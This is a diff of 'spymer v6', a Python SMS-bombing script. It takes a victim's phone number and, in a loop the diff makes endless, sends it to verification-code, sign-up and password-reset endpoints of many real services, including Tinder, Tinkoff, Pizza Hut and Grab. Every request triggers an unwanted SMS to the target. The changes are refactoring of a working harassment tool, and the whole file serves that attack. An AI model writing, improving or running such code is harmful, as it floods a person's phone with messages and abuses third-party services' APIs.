@@ -1,11 +1,19 @@
 #!/usr/bin/python3
 # spymer v6
 # Author: FSystem88
-class spymer:
+import requests
+import random
+import datetime
+import sys
+import time
+import argparse
+import os
+from colorama import Fore, Back, Style
+
+
+class Spymer:
 	def main(self):
-		import requests, random, datetime, sys, time, argparse, os
-		from colorama import Fore, Back, Style
-		os.system("clear")
+		os.system('cls' if os.name=='nt' else 'clear')
 		print(Fore.GREEN + '''
 8888888888888888888888888
 8888888888888888888888888
@@ -70,27 +78,27 @@ class spymer:
 			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 		iteration = 0			
 		_phone9 = _phone[1:]
-		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
-		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
-		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
-		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
-		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
+		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]  # +7+(915)350-99-08
+		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]  # 915+350-99-08
+		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]  # '+7+(915)350-99-08'
+		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]  # '+7 (915) 350 99 08'
+		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]  # '915) 350-99-08'
 		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
-		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
-		i = 1
+		print('Спамер запущен.')
+		print('Если Вы хотите остановить - нажмите Ctrl+Z.')
 		iteration = 0
-		while i < 2:
+		while True:
 			try:
 				self.formatted_phone = _phone
 				_email = _name+f'{iteration}'+'@gmail.com'
 				email = _name+f'{iteration}'+'@gmail.com'
 				requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 				requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-				requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-				requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-				requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+				requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone})
+				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
+				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
+				requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone})
+				requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone})
 				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 				requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
 				requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -139,5 +147,5 @@ class spymer:
 				print(('{} круг пройден.').format(iteration))
 			except:
 				pass
-spammer = spymer()
+spammer = Spymer()
 spammer.main()
